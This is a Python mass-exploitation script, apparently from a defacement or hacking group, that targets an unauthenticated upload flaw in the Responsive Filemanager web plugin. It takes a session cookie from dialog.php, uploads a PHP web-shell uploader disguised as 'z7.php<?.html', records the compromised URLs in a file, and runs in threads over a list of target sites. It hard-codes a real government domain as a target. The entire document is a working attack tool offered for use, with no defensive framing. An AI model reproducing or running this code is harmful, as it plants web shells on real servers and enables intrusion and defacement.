# -- Coded by @Zeerx7
# -- https://github.com/404rgr/Filemanager-File-Upload
# -- date: 23/01/2020

import requests, json, re
from multiprocessing import Pool
from multiprocessing.dummy import Pool as ThreadPool

live = 'http://perbenihan.ditjenbun.pertanian.go.id/'
class pausi:
  def __init__(self):
    self.uploader = '''<?php echo '#sess#ok#<center><pre>'.php_uname()."\n".'<b>{ Uploader by Zeerx7 }</b><form method="post" enctype="multipart/form-data"><input type="file" name="__"><input name="_" type="submit" value="Upload>>"></form>';if($_POST){if(@copy($_FILES['__']['tmp_name'], $_FILES['__']['name'])){echo '<b>Ok Uploaded';}else{echo '<b>Not uploaded!';}}?>'''
    #self.run(live)
    self.main()
  def banner(self):
     print('''\033[92m
_____ _ __
|   __|_| |___ _____ ___ ___ ___ ___ ___ ___ 
|   __| | | -_|     | .'|   | .'| . | -_|  _|
|__|  |_|_|___|_|_|_|__,|_|_|__,|_  |___|_|
                                |___|
 _____ _ _        _____     _           _
|   __|_| |___   |  |  |___| |___ ___ _| |
|   __| | | -_|  |  |  | . | | . | .'| . |
|__|  |_|_|___|  |_____|  _|_|___|__,|___|
                       |_|
\033[93m''')
  def run(self, site):
     if site:
       try:
        site = site+'/filemanager/dialog.php'
        x = requests.get(site)
        if x.status_code == 200:
           cookie = x.headers['Set-Cookie'].split(';')
           PHPSESSID =  cookie[0].replace('PHPSESSID=', '')
           url = site.replace('dialog.php','upload.php')
           #print PHPSESSID
           #print url
           cookies = {
              'PHPSESSID' : str(PHPSESSID)
           }
           data = {
               'fldr' : ''
           }
           files = {
               'files[]' : ('z7.php<?.html', str(self.uploader))
           }
           req = requests.post(url, data=data, files=files, cookies=cookies)
           if req.text:
                 jsons = json.loads(req.text)
                 open('Vuln.txt', 'a').write(jsons['files'][0]['url']+'\n')
                 print('\033[92mSuccess :: {}'.format(str(jsons['files'][0]['url'])))
                 #print jsons['files'][0]['url']]
           else:
                 print('\033[91mUpload Failed! :: {}'.format(str(url)))
        else:
           print("\033[91mError "+str(x.status_code)+' :: '+str(site))
       except: # ValueError as v:
        print("\033[91mNot Vuln :: "+str(url))
  def start(self, url):
    try:
      if url:
         if not re.search('http(s)?://', url):
             url = 'http://'+url
         self.run(str(url))
    except:
      pass
  def main(self):
    try:
      self.banner()
      lists = raw_input('Your List: ')
      lists = open(lists, 'r').read().splitlines()
      threads = input('Thread: ')
      pool = ThreadPool(threads)
      pool.map(self.start, lists)
      pool.close()
      pool.join()
    except:
      print('Error')

pausi()
